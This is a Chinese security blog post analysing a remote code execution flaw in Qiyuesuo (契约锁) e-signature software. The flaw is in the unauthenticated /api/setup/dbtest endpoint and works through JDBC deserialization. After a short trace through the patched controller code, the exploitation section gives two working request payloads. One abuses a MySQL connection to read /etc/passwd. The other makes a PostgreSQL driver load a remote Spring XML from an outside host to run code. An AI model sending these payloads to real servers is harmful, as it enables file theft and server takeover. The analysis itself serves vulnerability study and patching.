> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3ODkzNjkxMg==&mid=2247484021&idx=1&sn=b6f49af4c972818f134a3a18872a4d20

#  契约锁RCE分析  
原创 Kokoxca安全  Kokoxca安全   2025-06-19 05:36  
  
0x01.技术文章仅供参考学习，请勿使用本文中所提供的任何技术信息或代码工具进行非法测试和违法行为。若使用者利用本文中技术信息或代码工具对任何计算机系统造成的任何直接或者间接的后果及损失，均由使用者本人负责。本文所提供的技术信息或代码工具仅供于学习，一切不良后果与文章作者无关。使用者应该遵守法律法规，并尊重他人的合法权益。  
  
0x02 漏洞分析  
  
近期也是突然发现契约锁在网上爆出来存在rce漏洞，博主也好久没更新文章了浅浅的写一篇吧![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/LetMeSee.png "")  
  
  
言归正传这次爆出来的漏洞其实是契约锁最新更新了补丁，在补丁包中存在一个接口/setup/dbtest，根据补丁包中的接口进行源码分析。  
  
全局搜索/setup发现在  
classes/oss/com/qiyuesuo/config/ConsoleConfiguration[#ConsoleConfiguration中]()  
  
有的定义了接口是前台不需要鉴权的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ12k11xtJxVLG1gSmKes3nVZIicxPrFibuqsHhSEWv4H0FrnQSptz96UmIatmrT6upmVZUkMG04ichu7w/640?wx_fmt=png&from=appmsg "")  
  
接着全局搜索dbtest接口也就是这次的漏洞点。  
classes/oss/com/qiyuesuo/setup/SetupController#dbtest  
在代码中请求了一些数据库名，host，用户名等等，我们接着追check方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ12k11xtJxVLG1gSmKes3nVZ9w9COmJhX8ZaRjEu9carYibt9vyBffeTsRdZib1DewVjE0calt3tY5uQ/640?wx_fmt=png&from=appmsg "")  
  
发现在check方法中调用validateDatabase方法去验证数据库，接着追validateDatabase方法看详细内容。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ12k11xtJxVLG1gSmKes3nVZLreWonFKsfFMEdtYg1xxN3QAta2aHsicKa4pxyodsgJBIicwLfdjYASQ/640?wx_fmt=png&from=appmsg "")  
  
在validateDatabase方法中调用dbtest方法建立数据库连接。接着追dbtest方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ12k11xtJxVLG1gSmKes3nVZZIpWDBWib81XnPUibpr1NMhtO7wtRkdehMysmM50Z7I2sfzELCiaJWOhw/640?wx_fmt=png&from=appmsg "")  
  
在追到dbtest方法处的时候就能清楚的看到是从databaseService获取数据库连接然后检查连接是否非空且有效等等然后追踪databaseService.getConnection方法直接就是我们常见的jdbc反序列化调用了这没什么好分析的了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ12k11xtJxVLG1gSmKes3nVZsDZXnEibprlJc57KXOoBYdqAC6Ms7OaGEFpppRxicffZgbS4ev08dRoQ/640?wx_fmt=png&from=appmsg "")  
  
然后就是在契约锁中默认配置了一些数据库如mysql，PostgreSQL等等。针对去构造poc利用就行。  
  
0x03 漏洞利用  
  
  
MYSQL如下：  

```
/api/setup/dbtest?db=MYSQL&host=127.0.0.1%3A3308%2Ftest%3FallowLoadLocalInfile%3Dtrue%26allowUrlInLocalInfile%3Dtrue%26name%3D1%26username%3Dfileread_%2Fetc%2Fpasswd%26password%3D1&port=1&name=1&username=fileread_/etc/passwd&password=1
```

  
  
PostgreSQL如下：  

```
/api/setup/dbtest?db=POSTGRESQL&host=localhost&port=5321&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fxxx.dnslog.cn%2F1%2Exml
```

  
就目前来看是更新完补丁能打很少了。  
  
  
  
